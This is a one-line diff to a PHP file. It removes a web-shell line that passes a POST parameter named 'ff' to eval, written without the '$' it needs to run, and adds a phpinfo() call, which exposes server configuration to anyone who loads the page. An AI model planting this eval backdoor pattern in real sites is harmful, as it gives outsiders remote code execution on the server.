@@ -1,1 +1,1 @@
-<?php @eval(_POST[ff]);?>
+<?php phpinfo();?>
